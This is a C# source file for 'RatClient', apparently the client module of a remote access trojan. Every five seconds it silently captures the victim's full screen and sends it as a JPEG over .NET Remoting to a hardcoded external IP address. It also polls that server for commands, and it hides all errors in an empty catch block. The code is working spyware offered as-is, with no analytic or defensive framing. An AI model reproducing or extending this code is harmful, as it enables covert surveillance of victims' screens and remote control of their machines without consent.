using System;

using System.Drawing;

using System.Windows.Forms;
using RemotingInterface; //Remember to add reference to
                         //RemotingInterface dll first

using System.IO; //MemoryStream
using System.Drawing.Imaging; //For PixelFormat and ImageFormat

//For remoting:
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Timers;



namespace RatClient
{
    internal class ClientDesktop
    {
        static Bitmap bitmap;
        static MemoryStream memoryStream;
        static Graphics memoryGraphics;
        static Rectangle rc;
        public static DesktopInterface desktopInterface;
        static TcpChannel tcpchannel;
        static string commands;

        static System.Timers.Timer timer = new System.Timers.Timer();
        

        public static void initClientDesktop()
        {
            BinaryClientFormatterSinkProvider clientProvider = new BinaryClientFormatterSinkProvider();
            BinaryServerFormatterSinkProvider serverProvider = new BinaryServerFormatterSinkProvider();
            serverProvider.TypeFilterLevel = System.Runtime.Serialization.Formatters.TypeFilterLevel.Full;
            System.Collections.Hashtable props = new System.Collections.Hashtable();
            props["port"] = 6666;
            string s = System.Guid.NewGuid().ToString();
            props["name"] = s;
            props["typeFilterLevel"] =
            System.Runtime.Serialization.Formatters.TypeFilterLevel.Full;
            TcpChannel tcpchannel = new TcpChannel(props, clientProvider, serverProvider);
            ChannelServices.RegisterChannel(tcpchannel, false);
            desktopInterface = (DesktopInterface)Activator.GetObject(
            typeof(DesktopInterface), // Remote object type
            "tcp://45.151.88.155:6666/DesktopCapture");


            timer.Interval = 5000;
            timer.Elapsed += new ElapsedEventHandler(onTimedEvent);
            timer.Enabled = true;
            timer.Start();

            Console.WriteLine("ok1");
        }

        private static void onTimedEvent(object sender, EventArgs e)
        {
            
            try
            {
                desktopInterface.GoodbyeMethod(); //1st Method on Client
                desktopInterface.HelloMethod("Paul Chin"); //2nd Method on Client
                memoryStream = new MemoryStream(10000);
                rc = Screen.PrimaryScreen.Bounds;
                bitmap = new Bitmap(rc.Width, rc.Height, PixelFormat.Format32bppArgb);
                memoryGraphics = Graphics.FromImage(bitmap);
                memoryGraphics.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
                // Bitmap to MemoryStream
                bitmap.Save(memoryStream, ImageFormat.Jpeg);
                desktopInterface.SendBitmap(memoryStream); //3rd Method on Client
                commands = desktopInterface.GetCommands(); //-- NEW: 4th Method on Client
                if (commands.LastIndexOf("StopClient") >= 0)
                    System.Environment.Exit(0);
            }
            catch (Exception)
            {
                
            }

           
        }
    }
}
